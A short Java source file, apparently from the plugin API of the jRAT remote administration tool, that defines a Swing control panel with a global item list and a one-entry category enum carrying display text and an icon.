package jrat.api.ui;

import jrat.api.Resources;
import jrat.api.ui.ControlPanelItem;

import javax.swing.*;
import java.util.ArrayList;
import java.util.List;

public class ControlPanel {

    /**
     * Global control panel item list
     */
    public static final List<ControlPanelItem> ITEMS = new ArrayList<ControlPanelItem>();

    /**
     * A category in the control panel tree view
     */
    public enum Category {

        SYSTEM("System", Resources.getIcon("system-info"));

        /**
         * Required display text
         */
        public final String text;

        /**
         * Required icon
         */
        public final ImageIcon icon;

        Category(String text, ImageIcon icon) {
            this.text = text;
            this.icon = icon;
        }
    }
}
